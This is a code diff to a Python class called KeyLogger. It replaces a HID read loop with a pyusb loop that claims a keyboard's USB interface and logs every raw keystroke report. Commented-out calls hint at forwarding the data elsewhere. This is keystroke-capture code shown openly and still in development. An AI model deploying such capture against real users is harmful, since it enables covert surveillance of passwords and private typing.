@@ -66,39 +66,25 @@ class KeyLogger:
 
     # TODO: Rewrite this code
     def run(self):
-        import hid
-        id_vendor: int = 0x1c4f
-        device_id: int = 0x008b
-        keyboard = hid.device()
-        keyboard.open(device_id,id_vendor)  # Change the vendor and product IDs to match your keyboard
-
-        # Read and process HID reports
+        device =self.__find_device()
+        if device is None:
+            logging.error(f'Device is None in the run ')
+        usb.util.claim_interface(device, 0)
         while True:
-            data = keyboard.read(8)  # Read an 8-byte HID report
-            if data:
-                key_code = data[2]  # The key code is in byte 2
-                char = chr(key_code)  # Convert the key code to a character
-                print(f"Key pressed: {key_code} ({char})")
-        # device =self.__find_device()
-        # if device is None:
-        #     logging.error(f'Device is None in the run ')
-        # usb.util.claim_interface(device, 0)
-        # while True:
-        #     try:
-        #         # Endlosschleife zum Abhören des USB-Verkehrs
-        #         while True:
-        #             data: any = device.read(
-        #                 0x81, 64
-        #             )  # Endpoint-Adresse und Puffergröße anpassen
-        #             logging.info(
-        #                 f'{data}'
-        #             )
-        #             # self.__USBForwarder.send_data(data)
-        #             # self.data_handler.write(data)
-        #     except Exception as e:
-        #         logging.error(f"{e}")
-        #         pass
-        #test
+            try:
+                # Endlosschleife zum Abhören des USB-Verkehrs
+                while True:
+                    data: any = device.read(
+                        0x81, 64
+                    )  # Endpoint-Adresse und Puffergröße anpassen
+                    logging.info(
+                        f'{data.decode()}'
+                    )
+                    # self.__USBForwarder.send_data(data)
+                    # self.data_handler.write(data)
+            except Exception as e:
+                logging.error(f"{e}")
+                pass
         #TODO add later that we can use the keyboard again
         # finally:
         #     usb.util.release_interface(device, 0)
